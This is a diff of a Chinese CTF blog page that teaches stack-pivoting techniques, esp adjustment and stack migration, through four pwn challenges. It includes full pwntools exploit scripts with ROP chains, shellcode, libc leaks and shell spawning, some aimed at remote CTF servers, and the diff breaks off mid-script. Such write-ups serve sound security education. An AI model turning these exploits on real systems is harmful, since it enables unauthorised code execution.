@@ -1,37 +1,52 @@
+
+
 <!DOCTYPE html>
-<html lang="zh-CN">
-
-
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
 
 
 
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
   <link rel="icon" type="image/png" href="/img/favicon.png">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
+  <meta name="theme-color" content="#2f4154">
   <meta name="description" content>
   <meta name="author" content="chumen77">
   <meta name="keywords" content>
-  <title>花式栈溢出（栈帧的调节） ~ Chumen77&#39;s Blog</title>
+  <title>花式栈溢出（栈帧的调节） - Chumen77&#39;s Blog</title>
 
-  <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
-<link rel="stylesheet" href="/lib/bootstrap/css/bootstrap.min.css">
-<link rel="stylesheet" href="/lib/mdbootstrap/css/mdb.min.css">
-<link rel="stylesheet" href="/lib/github-markdown/github-markdown.min.css">
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+  <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
 
 
-  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
+  <link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css">
+  <link rel="stylesheet" href="/lib/hint/hint.min.css">
+
+  
+    
+    
+      
+      <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/apache-config.min.css">
+    
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
 
 <link rel="stylesheet" href="/css/main.css">
 
+<!-- 自定义样式保持在最底部 -->
 
-  <link rel="stylesheet" href="/lib/fancybox/jquery.fancybox.min.css">
 
-
+  <script src="/js/utils.js"></script>
+  <script src="/js/color-schema.js"></script>
 </head>
 
 
@@ -56,40 +71,60 @@
           
           
           
-          <li class="nav-item">
-            <a class="nav-link" href="/">首页</a>
-          </li>
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
         
           
           
           
           
-          <li class="nav-item">
-            <a class="nav-link" href="/archives/">归档</a>
-          </li>
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
         
           
           
           
           
-          <li class="nav-item">
-            <a class="nav-link" href="/tags/">标签</a>
-          </li>
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
         
           
           
           
           
-          <li class="nav-item">
-            <a class="nav-link" href="/about/">关于</a>
-          </li>
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
         
-          
-          
         
           <li class="nav-item" id="search-btn">
-            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
-                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
           </li>
         
       </ul>
@@ -97,51 +132,53 @@
   </div>
 </nav>
 
-    <div class="view intro-2" id="background" false
-         style="background: url('/img/default.png')no-repeat center center;
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
            background-size: cover;">
       <div class="full-bg-img">
-        <div class="mask rgba-black-light flex-center">
-          <div class="container text-center white-text fadeInUp">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
             <span class="h2" id="subtitle">
               
             </span>
 
             
-              <br>
-              
-                <p class="mt-3">
-                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>&nbsp;
-                  星期三, 二月 5日 2020, 4:53 下午
-                </p>
-              
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-02-05 16:53" pubdate>
+        2020年2月5日 下午
+      </time>
+    </span>
+  
+</div>
 
-              <p>
-                
-                  
-                  &nbsp;<i class="far fa-chart-bar"></i>
-                  <span class="post-count">
-                    3.2k 字
-                  </span>&nbsp;
-                
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      3.2k 字
+    </span>
+  
 
-                
-                  
-                  &nbsp;<i class="far fa-clock"></i>
-                  <span class="post-count">
-                      13 分钟
-                  </span>&nbsp;
-                
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      40
+       分钟
+    </span>
+  
 
-                
-                  <!-- 不蒜子统计文章PV -->
-                  
-                  &nbsp;<i class="far fa-eye" aria-hidden="true"></i>&nbsp;
-                  <span id="busuanzi_container_page_pv">
-                    <span id="busuanzi_value_page_pv"></span> 次
-                  </span>&nbsp;
-                
-              </p>
+  
+  
+</div>
+
             
           </div>
 
@@ -159,10 +196,14 @@
   <div class="row">
     <div class="d-none d-lg-block col-lg-2"></div>
     <div class="col-lg-8 nopadding-md">
-      <div class="py-5 z-depth-3" id="board">
-        <div class="post-content mx-auto" id="post">
-          <div class="markdown-body">
-            <h1 id="花式栈溢出（栈帧的调节）"><a href="#花式栈溢出（栈帧的调节）" class="headerlink" title="花式栈溢出（栈帧的调节）"></a>花式栈溢出（栈帧的调节）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本人刚学pwn不久，最近在学习过程中学到了各种需要栈帧调节的题目，以此记录一下。<br>在一些栈溢出的程序中，我们会碰到一些问题，例如溢出的可控字节数太少，无法构造我们想要的rop链，程序ASLR开启后导致的栈地址不可预测等。对于这种问题，常用的思路包括：</p>
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">花式栈溢出（栈帧的调节）</h1>
+            
+            <div class="markdown-body" id="post-body">
+              <h1 id="花式栈溢出（栈帧的调节）"><a href="#花式栈溢出（栈帧的调节）" class="headerlink" title="花式栈溢出（栈帧的调节）"></a>花式栈溢出（栈帧的调节）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本人刚学pwn不久，最近在学习过程中学到了各种需要栈帧调节的题目，以此记录一下。<br>在一些栈溢出的程序中，我们会碰到一些问题，例如溢出的可控字节数太少，无法构造我们想要的rop链，程序ASLR开启后导致的栈地址不可预测等。对于这种问题，常用的思路包括：</p>
 <ul>
 <li>加减esp值，控制栈指针</li>
 <li>Stack Migration来构造一个假的栈帧。</li>
@@ -174,11 +215,11 @@
 <h4 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h4><p>由于这个程序使用静态编译和strip命令剥离符号，用ida打开没有我们平时看的那么简单，<br>很多函数已经无法识别，我们就需要自己调试，然后推测是什么函数。<br><img src="http://qiqianyun.chumen77.xyz/15808932166761.jpg" srcset="/img/loading.gif" alt="-w618"><br>start函数中，call的函数是__libc_start_main, 上一行的 offset则是main函数<br>那个箭头就是main函数了。进入main函数以后，<strong>可以经过syscall中rax的参数来确认其是什么函数</strong>，很明显一个函数是alarm函数，先手动nop一下。<br><img src="http://qiqianyun.chumen77.xyz/15808934501240.jpg" srcset="/img/loading.gif" alt="-w555"><br>把这个函数去除后，方便gdb的后期调试。接着可以很容易确定一下puts函数跟read函数，在ida中修改一下。<img src="http://qiqianyun.chumen77.xyz/15808936171885.jpg" srcset="/img/loading.gif" alt="-w528"><br>下面那个40108e函数是比较复杂的，我用edb动态调试来确定出其中的某些函数：<br><img src="http://qiqianyun.chumen77.xyz/15808938970186.jpg" srcset="/img/loading.gif" alt="-w857"><br>对于这个函数，先确定一下其参数。<br><img src="http://qiqianyun.chumen77.xyz/15808939630394.jpg" srcset="/img/loading.gif" alt="-w824"><br><img src="http://qiqianyun.chumen77.xyz/15808939828470.jpg" srcset="/img/loading.gif" alt="-w322"><br>dump过去就会发现是复制了一份。所以就确定这个函数是<code>strncpy</code>是函数。<br>对于这个函数<code>char *strncpy(char *dest, const char *src, int n)</code><strong>将src指向的字符数组中n个字符复制到dest指向的字符数组中，在第一个空字符处停止，并返回被复制后的dest</strong>。<br><img src="http://qiqianyun.chumen77.xyz/15808946102427.jpg" srcset="/img/loading.gif" alt="-w781"><br>对于下一段就是判断一下，是否与0x79和0x70相等，可以来手动修改值让其相等。<br><img src="http://qiqianyun.chumen77.xyz/15808947377600.jpg" srcset="/img/loading.gif" alt="-w803"><br>往后走会发现先溢出了，在做溢出题的时候看到return 就应该想办法想上跳。<br><img src="http://qiqianyun.chumen77.xyz/15808948243514.jpg" srcset="/img/loading.gif" alt="-w368"><br>溢出的这个地址就是刚刚又syrcpy函数复制过来0x50字节中的最后8个字节，因为是strncpy函数，<strong>我们输入的字符串中是不能有\x00</strong>，否则会被截断，从而无法复制满0x50字节制造可控溢出，所以前0x48个字节中，我们不能写入任何地址。在这种情况下就需要通过修改esp来完成漏洞利用。</p>
 <p>在最前面的read函数中，给了十分大的缓冲区可以用，我们可以把ROP链放在0x50字节之后，然后通过增加esp的值把栈顶抬到ROP链上，紧接着执行这个rop链即可。</p>
 <p>查到one_gadget发现<code>0x000000000046f205 : add rsp, 0x58 ; ret</code>正好符合要求。然后gdb调试一下确定一下rop链从50个字节后的那里开始合适即可。<strong>（这个在找onegadget的时候注意不要把rsp搞成esp了，自己在做的时候因为这个调试了半天，才发现是这个错误，导致exp不成功）</strong></p>
-<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre><code>from pwn import *
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code>from pwn import *
 import time
-io = process(&#39;./vss&#39;)
-e = ELF(&#39;./vss&#39;)
-io.recvuntil(&#39;Password:\n&#39;)
+io = process(&apos;./vss&apos;)
+e = ELF(&apos;./vss&apos;)
+io.recvuntil(&apos;Password:\n&apos;)
 add_rsp_0x58_ret = 0x0046f205
 pop_rax_ret = 0x0046f208
 pop_rdi_ret = 0x0401823
@@ -206,46 +247,46 @@ rop1 = [
     0,
     syscall_ret
 ]
-# raw_input(&#39;-&gt;&#39;)
-io.sendline(&#39;py&#39; + &#39;a&#39;*70 + p64(add_rsp_0x58_ret)+ &#39;b&#39;* 8 + &#39;&#39;.join(map(p64,rop1)))
-# raw_input(&#39;-&gt;&#39;)
+# raw_input(&apos;-&gt;&apos;)
+io.sendline(&apos;py&apos; + &apos;a&apos;*70 + p64(add_rsp_0x58_ret)+ &apos;b&apos;* 8 + &apos;&apos;.join(map(p64,rop1)))
+# raw_input(&apos;-&gt;&apos;)
 sleep(0.1)
-io.send(&#39;/bin/sh\x00&#39;)
-io.interactive()</code></pre><h3 id="X-CTF-Quals-2016-b0verfl0w"><a href="#X-CTF-Quals-2016-b0verfl0w" class="headerlink" title="X-CTF Quals 2016-b0verfl0w"></a>X-CTF Quals 2016-b0verfl0w</h3><h4 id="查保护和arch"><a href="#查保护和arch" class="headerlink" title="查保护和arch"></a>查保护和arch</h4><p><img src="http://qiqianyun.chumen77.xyz/15811429422510.jpg" srcset="/img/loading.gif" alt="-w438"><br>这个nx也没有开，可以用栈执行shellcode</p>
-<h4 id="ida分析-1"><a href="#ida分析-1" class="headerlink" title="ida分析"></a>ida分析</h4><pre><code>signed int vul()
+io.send(&apos;/bin/sh\x00&apos;)
+io.interactive()</code></pre></div><h3 id="X-CTF-Quals-2016-b0verfl0w"><a href="#X-CTF-Quals-2016-b0verfl0w" class="headerlink" title="X-CTF Quals 2016-b0verfl0w"></a>X-CTF Quals 2016-b0verfl0w</h3><h4 id="查保护和arch"><a href="#查保护和arch" class="headerlink" title="查保护和arch"></a>查保护和arch</h4><p><img src="http://qiqianyun.chumen77.xyz/15811429422510.jpg" srcset="/img/loading.gif" alt="-w438"><br>这个nx也没有开，可以用栈执行shellcode</p>
+<h4 id="ida分析-1"><a href="#ida分析-1" class="headerlink" title="ida分析"></a>ida分析</h4><div class="hljs"><pre><code>signed int vul()
 {
   char s; // [esp+18h] [ebp-20h]
 
   puts(&quot;\n======================&quot;);
   puts(&quot;\nWelcome to X-CTF 2016!&quot;);
   puts(&quot;\n======================&quot;);
-  puts(&quot;What&#39;s your name?&quot;);
+  puts(&quot;What&apos;s your name?&quot;);
   fflush(stdout);
   fgets(&amp;s, 50, stdin);
   printf(&quot;Hello %s.&quot;, &amp;s);
   fflush(stdout);
   return 1;
-}</code></pre><p>代码很简单，但是可以发现可以溢出的字节只有50-0x20-4=14个字节可控，所以是很难写出rop链来获取咱们目的的。然后就可以考虑控制栈指针的攻击思路，就是先把shellcode摆在栈上，然后控制eip到达这里就可以了。但是由于程序本身会开启 ASLR 保护，所以我们很难直接知道 shellcode 的地址。但是栈上相对偏移是固定的，所以我们可以利用栈溢出对 esp 进行操作，使其指向 shellcode 处，并且直接控制程序跳转至 esp 处。</p>
+}</code></pre></div><p>代码很简单，但是可以发现可以溢出的字节只有50-0x20-4=14个字节可控，所以是很难写出rop链来获取咱们目的的。然后就可以考虑控制栈指针的攻击思路，就是先把shellcode摆在栈上，然后控制eip到达这里就可以了。但是由于程序本身会开启 ASLR 保护，所以我们很难直接知道 shellcode 的地址。但是栈上相对偏移是固定的，所以我们可以利用栈溢出对 esp 进行操作，使其指向 shellcode 处，并且直接控制程序跳转至 esp 处。</p>
 <p>找一下控制esp的gadget<br>    0x08048504 : jmp esp<br>然后怎么控制eip到shellcode上呢，因为没有nx保护，我们可以写一段指令来控制偏移：</p>
-<pre><code>sub esp,0x28
-jmp esp</code></pre><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><pre><code>from pwn import *
-#io = process(&#39;./b0verfl0w&#39;)
-context.arch = &#39;i386&#39;
-io = remote(&#39;node3.buuoj.cn&#39;,29410)
+<div class="hljs"><pre><code>sub esp,0x28
+jmp esp</code></pre></div><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code>from pwn import *
+#io = process(&apos;./b0verfl0w&apos;)
+context.arch = &apos;i386&apos;
+io = remote(&apos;node3.buuoj.cn&apos;,29410)
 shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;
 shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;
 shellcode += &quot;\x0b\xcd\x80&quot;
-sub_esp_jmp = asm(&#39;sub esp, 0x28;jmp esp&#39;)
+sub_esp_jmp = asm(&apos;sub esp, 0x28;jmp esp&apos;)
 jmp_esp = 0x08048504
-payload = shellcode + (36-len(shellcode_x86))*&#39;b&#39;+p32(jmp_esp) + sub_esp_jmp
-io.readuntil(&#39;?\n&#39;)
-#raw_input(&#39;-&gt;&#39;)
+payload = shellcode + (36-len(shellcode_x86))*&apos;b&apos;+p32(jmp_esp) + sub_esp_jmp
+io.readuntil(&apos;?\n&apos;)
+#raw_input(&apos;-&gt;&apos;)
 io.sendline(payload)
-io.interactive()</code></pre><h2 id="Stack-Migration"><a href="#Stack-Migration" class="headerlink" title="Stack Migration"></a>Stack Migration</h2><p>在 Stack Migration 中，我们所利用的技巧便是同时控制 EBP 与 EIP，这样我们在控制程序执行流的同时，也改变程序栈帧的位置。</p>
+io.interactive()</code></pre></div><h2 id="Stack-Migration"><a href="#Stack-Migration" class="headerlink" title="Stack Migration"></a>Stack Migration</h2><p>在 Stack Migration 中，我们所利用的技巧便是同时控制 EBP 与 EIP，这样我们在控制程序执行流的同时，也改变程序栈帧的位置。</p>
 <h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>我们知道在函数建立栈帧时有两条指令<code>push ebp; mov ebp, esp</code>，而退出时同样需要消除这两条指令的影响，即<code>leave(mov esp, ebp; pop ebp)</code> 。且leave一般紧跟着就是ret。<strong>因此，在存在栈溢出的程序中，只要我们能控制到栈中的ebp，我们就可以通过两次leave劫持栈。</strong></p>
 <p><img src="http://qiqianyun.chumen77.xyz/15813373484321.jpg" srcset="/img/loading.gif" alt="-w533"><br>第一次随着程序流<code>leave; ret</code>，new esp为我们构造新栈的目标地址。 可以看到执行到ret时，esp还在原来的old栈上，而ebp已经指向了新的栈的栈顶。<br><img src="https://s2.ax1x.com/2020/02/11/1ovtYT.jpg" srcset="/img/loading.gif" alt="1ovtYT.jpg"><br>第二次进入我们放入栈上的<code>leave; ret</code> 的gadget（<strong>这个是我们事先写上栈的</strong>）esp已经被成功劫持到新的栈上，执行完gadget后栈顶会 在new_esp-4(64位是-8)的位置上。此时栈完全可控了，通过预先或者之后在new stack上布置的rop链可以轻松完成攻击。<br><img src="https://s2.ax1x.com/2020/02/11/1oxKN6.png" srcset="/img/loading.gif" alt="1oxKN6.png"><br><img src="https://s2.ax1x.com/2020/02/11/1ovjXj.png" srcset="/img/loading.gif" alt="1ovjXj.png"></p>
 <h3 id="HITCON-training-lab6-64位"><a href="#HITCON-training-lab6-64位" class="headerlink" title="HITCON_training_lab6_64位"></a>HITCON_training_lab6_64位</h3><p>这个是在HITCON_training的一个练习，直接给的有源码，我给编译成了64位版本。</p>
-<h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><pre><code>#include &lt;stdio.h&gt;
+<h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><div class="hljs"><pre><code>#include &lt;stdio.h&gt;
 int count = 1337 ;
 char *t= &quot;Z\xc3&quot; ;
 int main(){
@@ -258,19 +299,19 @@ setvbuf(stdout,0,2,0);
 puts(&quot;Try your best : &quot; );
 read(0, buf,128);
 return ;
-}</code></pre><p><code>gcc  -z relro -z now -fno-stack-protector -mpreferred-stack-boundary=2 migration.c -o migration</code> 编译命令</p>
+}</code></pre></div><p><code>gcc  -z relro -z now -fno-stack-protector -mpreferred-stack-boundary=2 migration.c -o migration</code> 编译命令</p>
 <h4 id="简单分析"><a href="#简单分析" class="headerlink" title="简单分析"></a>简单分析</h4><p>这个题纯粹就是为了练习的Stack Migration用的，可以不分析代码直接用gdb-peda直接来测试：<br><img src="http://qiqianyun.chumen77.xyz/15813398610900.jpg" srcset="/img/loading.gif" alt="-w332"><br><img src="http://qiqianyun.chumen77.xyz/15813398926858.jpg" srcset="/img/loading.gif" alt="-w955"><br>熟悉的栈溢出，但是下面多出来的一些字符串，也是程序不能接受的部分，也可以作为一个需要考虑栈迁移的标志。<br><img src="https://s2.ax1x.com/2020/02/11/1og2r9.jpg" srcset="/img/loading.gif" alt="1og2r9.jpg"><br>注意一下rsp被覆盖的值。<br><img src="https://s2.ax1x.com/2020/02/11/1ogs8U.jpg" srcset="/img/loading.gif" alt="1ogs8U.jpg"><br>计算padding为48.<br><img src="https://s2.ax1x.com/2020/02/11/1ogwEq.jpg" srcset="/img/loading.gif" alt="1ogwEq.jpg"><br>计算一下，可以填入多少的可控字段。去除一下刚刚程序不能存入的部分和padding部分，还有80个字节可以用。其中一个来伪造new esp，剩下也就还有9个gadget可以用，可以给我构造第一个rop链。</p>
 <h4 id="图解分析"><a href="#图解分析" class="headerlink" title="图解分析"></a>图解分析</h4><p>假设我们已经填入了溢出字符，buf1即为我们要去的新栈，这个选择bss段的后一半：<br><img src="https://s2.ax1x.com/2020/02/11/1ogabn.jpg" srcset="/img/loading.gif" alt="1ogabn.jpg"><br>开始执行一下leave 中的<code>mov rsp,rbp</code>：<br><img src="https://s2.ax1x.com/2020/02/11/1ogUDs.jpg" srcset="/img/loading.gif" alt="1ogUDs.jpg"><br>此时rsp 也指向了 rbp指向的位置，在执行leave中的<code>pop rbp</code>:<br><img src="https://s2.ax1x.com/2020/02/11/1ocMfU.jpg" srcset="/img/loading.gif" alt="1ocMfU.jpg"><br>此时rbp已经到了我们伪造的新栈buf1，然后开始执行ret,进入执行pop_rdi的gadget:<br><img src="https://s2.ax1x.com/2020/02/11/1ocZmn.jpg" srcset="/img/loading.gif" alt="1ocZmn.jpg"><br><img src="https://s2.ax1x.com/2020/02/11/1ocklQ.jpg" srcset="/img/loading.gif" alt="1ocklQ.jpg"></p>
 <p>此时已经将buf1的地址，推入rdi，作为gets的参数，执行gets函数后，我们就可以往buf1上填入我们的rop链，此时栈大小已经没有限制了，可以任意写。<br><img src="https://s2.ax1x.com/2020/02/11/1o6oo6.jpg" srcset="/img/loading.gif" alt="1o6oo6.jpg"><br><img src="https://s2.ax1x.com/2020/02/11/1o6gWF.jpg" srcset="/img/loading.gif" alt="1o6gWF.jpg"><br>在这个buf1的栈空间里，我们需要先把rbp指向的位置写入buf2（下一个构造的新栈），然后构造rop链把puts的内存地址给泄露出来，进而可以算出libc的基地址，接着再构造一个gets函数。接着是执行一下leave 的gadget：<br><img src="https://s2.ax1x.com/2020/02/11/1o60Ln.jpg" srcset="/img/loading.gif" alt="1o60Ln.jpg"><br><img src="https://s2.ax1x.com/2020/02/11/1o6NRg.jpg" srcset="/img/loading.gif" alt="1o6NRg.jpg"><br>执行完以后就可以发现我们，已经完全控制了栈。并且开了一个buf2的新栈，留着在buf1调用gets函数时来在buf2新栈中摆上调用system(/bin/sh)函数的rop链。然后继续执行：<br><img src="https://s2.ax1x.com/2020/02/11/1o6tJS.jpg" srcset="/img/loading.gif" alt="1o6tJS.jpg"><br><img src="https://s2.ax1x.com/2020/02/11/1o6Yi8.jpg" srcset="/img/loading.gif" alt="1o6Yi8.jpg"><br>这就泄露出了puts函数的内存地址。接着开始往buf2新栈上读rop链:<br><img src="https://s2.ax1x.com/2020/02/11/1o6lqI.jpg" srcset="/img/loading.gif" alt="1o6lqI.jpg"><br><img src="https://s2.ax1x.com/2020/02/11/1o6QsA.jpg" srcset="/img/loading.gif" alt="1o6QsA.jpg"><br><img src="https://s2.ax1x.com/2020/02/11/1o6VIK.jpg" srcset="/img/loading.gif" alt="1o6VIK.jpg"><br>读入完成，接着再次执行leave的gadget：<br><img src="https://s2.ax1x.com/2020/02/11/1o6AVx.jpg" srcset="/img/loading.gif" alt="1o6AVx.jpg"><br><img src="https://s2.ax1x.com/2020/02/11/1oyk4S.jpg" srcset="/img/loading.gif" alt="1oyk4S.jpg"><br>可以看到esp到了新栈，rbp因为刚刚在buf2填入的buf1，又会到了buf1，这个地址可以随便填了，对做题不影响，填写这个只是可以看到再次栈转移。接着执行buf2新栈的rop链：<br><img src="https://s2.ax1x.com/2020/02/11/1os600.jpg" srcset="/img/loading.gif" alt="1os600.jpg"><br>就可以拿到shell了。</p>
 <h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>借着这个思路就可以开始写exp:</p>
-<pre><code>from pwn import *
+<div class="hljs"><pre><code>from pwn import *
 import time
-context.arch = &#39;amd64&#39;
-context.log_level = &#39;debug&#39;
-e = ELF(&#39;./test&#39;)
-l = ELF(&#39;/lib/x86_64-linux-gnu/libc-2.23.so&#39;) 
-# io = remote(&#39;127.0.0.1&#39;,4000)
-io = process(&#39;./test&#39;)
+context.arch = &apos;amd64&apos;
+context.log_level = &apos;debug&apos;
+e = ELF(&apos;./test&apos;)
+l = ELF(&apos;/lib/x86_64-linux-gnu/libc-2.23.so&apos;) 
+# io = remote(&apos;127.0.0.1&apos;,4000)
+io = process(&apos;./test&apos;)
 pop_rdi_ret = 0x400703
 pop_rsi_r15_ret= 0x0400701
 pop_rdx_ret= 0x0400724
@@ -278,38 +319,38 @@ leave_ret= 0x0400699
 buf1 = 0x00602000 - 0x200
 buf2 = buf1 + 0x100
 padding = 56 - 8
-puts_plt = e.symbols[&#39;puts&#39;]
-puts_got = e.got[&#39;puts&#39;]
-read_add = e.symbols[&#39;read&#39;]
-io.recvuntil(&#39;:&#39;)
-p = &#39;a&#39;*padding + flat([buf1,pop_rdi_ret,0,pop_rsi_r15_ret,buf1,0,pop_rdx_ret,0x100,read_add,leave_ret])
-#raw_input(&#39;-&gt;&#39;)
+puts_plt = e.symbols[&apos;puts&apos;]
+puts_got = e.got[&apos;puts&apos;]
+read_add = e.symbols[&apos;read&apos;]
+io.recvuntil(&apos;:&apos;)
+p = &apos;a&apos;*padding + flat([buf1,pop_rdi_ret,0,pop_rsi_r15_ret,buf1,0,pop_rdx_ret,0x100,read_add,leave_ret])
+#raw_input(&apos;-&gt;&apos;)
 io.send(p)
 sleep(0.1)
 p = flat([buf2,pop_rdi_ret,puts_got,puts_plt,pop_rdi_ret,0,pop_rsi_r15_ret,buf2,0,pop_rdx_ret,0x100,read_add,leave_ret])
 sleep(0.1)
-#raw_input(&#39;-&gt;&#39;)
+#raw_input(&apos;-&gt;&apos;)
 io.sendline(p)
-io.recvuntil(&#39;\n&#39;)
-puts = u64((io.recv(6)).ljust(8,&#39;\x00&#39;))
-libc = puts - l.symbols[&#39;puts&#39;]
-print(&#39;libc_base:&#39; + hex(libc))
-binsh_add = l.search(&#39;/bin/sh\x00&#39;).next() + libc
+io.recvuntil(&apos;\n&apos;)
+puts = u64((io.recv(6)).ljust(8,&apos;\x00&apos;))
+libc = puts - l.symbols[&apos;puts&apos;]
+print(&apos;libc_base:&apos; + hex(libc))
+binsh_add = l.search(&apos;/bin/sh\x00&apos;).next() + libc
 #print(binsh_add)
-# raw_input(&#39;-&gt;&#39;)
-system_add = l.symbols[&#39;system&#39;] + libc
+# raw_input(&apos;-&gt;&apos;)
+system_add = l.symbols[&apos;system&apos;] + libc
 p = flat([buf1,pop_rdi_ret,binsh_add,system_add])
 sleep(0.1)
 io.sendline(p)
-io.interactive()</code></pre><h3 id="Hgame2020-week2-rop-level2"><a href="#Hgame2020-week2-rop-level2" class="headerlink" title="Hgame2020_week2_rop_level2"></a>Hgame2020_week2_rop_level2</h3><h4 id="查保护和arch-1"><a href="#查保护和arch-1" class="headerlink" title="查保护和arch"></a>查保护和arch</h4><p><img src="https://s2.ax1x.com/2020/02/11/1os8OI.jpg" srcset="/img/loading.gif" alt="1os8OI.jpg"><br>32位程序，开了nx保护</p>
+io.interactive()</code></pre></div><h3 id="Hgame2020-week2-rop-level2"><a href="#Hgame2020-week2-rop-level2" class="headerlink" title="Hgame2020_week2_rop_level2"></a>Hgame2020_week2_rop_level2</h3><h4 id="查保护和arch-1"><a href="#查保护和arch-1" class="headerlink" title="查保护和arch"></a>查保护和arch</h4><p><img src="https://s2.ax1x.com/2020/02/11/1os8OI.jpg" srcset="/img/loading.gif" alt="1os8OI.jpg"><br>32位程序，开了nx保护</p>
 <h4 id="ida分析-2"><a href="#ida分析-2" class="headerlink" title="ida分析"></a>ida分析</h4><p><img src="https://s2.ax1x.com/2020/02/11/1osEO1.md.jpg" srcset="/img/loading.gif" alt="1osEO1.md.jpg"><br>这个明显的栈溢出，但是0x60-0x50-0x8 = 8。发现只有一个gadget位置，无法构造我们想要的rop链。但是前面的第一个read函数，可以读入很大空间，并且第二个参数buf的地址是固定的。<br><img src="https://s2.ax1x.com/2020/02/11/1orMMn.jpg" srcset="/img/loading.gif" alt="1orMMn.jpg"><br>那这个题明显就是可以Stack Migration来解决问题了，并且只需再写一个leave ret就控制栈了。</p>
 <h5 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h5><p>程序中有着open，read，puts函数，我们可以写一个rop链，调用open函数，控制其参数是<code>./flag</code>，并在gdb中调试将其返回的文件fd号记录下来，然后传递给read函数，让其读入文件内容存入某个缓冲区，再用puts函数输出一下flag文件的内容即可。在第一个read的时候，我们就需要写好rop链。然后在最后一个read函数时，控制好ebp指向我们的新栈。</p>
-<h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><pre><code>from pwn import *
-context.log_level = &#39;debug&#39;
-context.arch = &#39;amd64&#39;
-# io = process(&#39;./ROP&#39;)
-io = remote(&#39;47.103.214.163&#39;,20300)
-e = ELF(&#39;./ROP&#39;)
+<h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><div class="hljs"><pre><code>from pwn import *
+context.log_level = &apos;debug&apos;
+context.arch = &apos;amd64&apos;
+# io = process(&apos;./ROP&apos;)
+io = remote(&apos;47.103.214.163&apos;,20300)
+e = ELF(&apos;./ROP&apos;)
 buf = 0x06010A0
 # libc = e.libc
 padding = 80
@@ -319,16 +360,16 @@ pop_rsi_r15 = 0x00400a41
 open_plt = 0x4007b0
 read_plt = 0x400780
 puts_plt = 0x400760
-io.recvuntil(&#39;think so?\n&#39;)
-p = flat([&#39;./flag\x00\x00&#39;,pop_rdi_ret,buf,pop_rsi_r15,0,0,open_plt,pop_rdi_ret,4,pop_rsi_r15,buf+0x80,0,read_plt,pop_rdi_ret,buf+0x80,puts_plt])
+io.recvuntil(&apos;think so?\n&apos;)
+p = flat([&apos;./flag\x00\x00&apos;,pop_rdi_ret,buf,pop_rsi_r15,0,0,open_plt,pop_rdi_ret,4,pop_rsi_r15,buf+0x80,0,read_plt,pop_rdi_ret,buf+0x80,puts_plt])
 io.sendline(p)
-io.recvuntil(&#39;\n&#39;)
